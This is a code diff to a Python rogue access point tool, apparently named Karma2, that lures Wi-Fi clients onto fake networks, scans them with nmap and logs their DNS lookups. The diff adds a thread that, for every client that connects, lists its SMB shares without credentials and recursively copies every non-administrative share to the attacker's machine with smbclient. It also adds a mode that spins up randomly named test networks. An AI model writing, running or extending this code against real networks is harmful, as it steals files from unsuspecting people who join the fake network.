@@ -15,6 +15,7 @@ import json
 import base64
 import signal
 import ssl
+import string
 
 DEFAULT = '\033[49m\033[39m'
 RED = '\033[91m'
@@ -62,6 +63,7 @@ def parse_args():
     parser.add_argument("-d", "--debug", action='store_true', help="debug mode")
     parser.add_argument("-u", "--uri", help="wifiScanMap sync uri")
     parser.add_argument("-b", "--forbidden", help="list of forBidden essid")
+    parser.add_argument("-q", "--test", action='store_true', help="run test mode")
     return parser.parse_args()
 
 def log(message):
@@ -69,6 +71,31 @@ def log(message):
 
 class Karma2:
 
+  class SambaCrawler(Thread):
+    daemon = True
+    def __init__(self, app, ip, dest):
+      Thread.__init__(self)
+      self.app = app
+      self.ip = ip
+      self.dest = dest
+    
+    def run(self):
+      set_title('SambaCrawler %s'%self.ip)
+      
+      cmd = ['smbclient','//%s/'%self.ip, '-N', '-L', self.ip]
+      out = subprocess.check_output(cmd)
+      res = re.findall("\s(.*)\sDisk",out)
+      if res is not None:
+        os.mkdir(self.dest)
+        for share in res:
+          r = share.strip()
+          if not '$' in r:
+            path = "%s/%s"%(self.dest,r)
+            os.mkdir(path)
+            log('Samba: Getting %s'%r)
+            cmd = ['smbclient', '//%s/%s'%(self.ip,r),'--socket-options=\'TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072\'', '-N', '-c', '\'prompt OFF;recurse ON;cd \'/\';lcd \'%s\';mget *\''%path]
+            out = subprocess.check_output(' '.join(cmd), shell=True)
+      
   class Webserver(Thread):
     daemon=True
     def __init__(self, app, port = 80):
@@ -318,6 +345,8 @@ class Karma2:
       if not self.clients.has_key(mac):
         self.clients[mac] = ip
         log( "new client %s (%s) %s"%(mac, _ctxt(ip, GREEN), name))
+        smb = Karma2.SambaCrawler(self.karma, ip, 'smb_%s'%mac)
+        smb.start()
         if self.karma.scan:
           try:
             self.nmaps.append(self.nmap(ip))
@@ -337,6 +366,7 @@ class Karma2:
           try:
             self.hostapd_process.kill()
             self.hostapd_process.wait()
+            time.sleep(0.5)
           except:
             log( "%s could not kill hostapd"%_ctxt("[!]",RED))
           if self.tcpdump_process is not None:
@@ -362,11 +392,13 @@ class Karma2:
           for p in self.nmaps:
             p.kill()
             p.wait()
-          
-          self.karma.release_ap(self.essid)
+          try:
+            self.karma.release_ap(self.essid)
+          except:
+            pass
           self.karma.ifhostapds.free_one(self.ifhostapd)
           self.karma.free_subnet(self.subnet)
-      
+      tests = ""
       while True:
 
         # check alive
@@ -414,10 +446,10 @@ class Karma2:
               continue
           #print line
           m = re.match(
-            r".*failed.*", line)
+            r".*failed.*\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", line)
           if m is not None:
             log( "%s %s"%(_ctxt("[!]",RED), line))
-            #_killall()
+            _killall()
           else:
             m = re.match(
               r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*",line)
@@ -436,6 +468,8 @@ class Karma2:
           line = self.hostapd_process.stdout.readline()
           if len(line) == 0:
             continue
+          tests = "%s%s"%(tests,line)
+          #print line
           m = re.match(r".*: STA ([a-zA-Z0-9:]+) IEEE 802.11: authenticated",line)
           if m is not None:
             mac, = m.groups()
@@ -450,6 +484,7 @@ class Karma2:
               log( "%s Unable to start hostapd on interface %s: %s"%(_ctxt("[!]",RED),_ctxt(ifname,RED), line))
               # will remove AP from list on next check
               self.activity_ts = None  
+              print tests
 
         if dnswfd in rlist:
           line = self.dnswatch_process.stdout.readline()
@@ -482,7 +517,7 @@ class Karma2:
               log( "[+] %s => %s"%(dns['bssid'], dns['host']))
 
           self.activity_ts = time.time()
-        time.sleep(0.5)
+        time.sleep(0.005)
 
     def nmap(self, ip):
       log( "[+] nmapping %s"%ip)
@@ -563,6 +598,7 @@ class Karma2:
         f.write("bssid=%s\n"%(bssid))
       f.write("interface=%s\n"%(interface))
       f.write("channel=%s\n"%(channel))
+      f.write("hw_mode=g\n")
       #f.write("ignore_broadcast_ssid=1")
       if wpa2 is not None:
         f.write("wpa=2\n")
@@ -768,7 +804,7 @@ if __name__ == '__main__':
   from distutils.spawn import find_executable
 
   CHECK_EXECUTABLES = (
-    'hostapd','nmap','iptables','tcpdump','dnsmasq','airmon-ng',
+    'hostapd','nmap','iptables','tcpdump','dnsmasq','airmon-ng', 'smbclient',
   )
 
   # check for executables
@@ -821,9 +857,15 @@ if __name__ == '__main__':
         pass
       km.create_ap(essid, bssid, 60*60*24)
     else:
-      km.do_sniff()
+      if not args.test:
+        km.do_sniff()
 
     while True:
+      if args.test:
+        char_set = string.ascii_uppercase + string.digits
+        essid = ''.join(random.sample(char_set*6, 6))
+        km.create_ap("test_%s"%essid, None)
+        
       time.sleep(1)
 
   except KeyboardInterrupt:
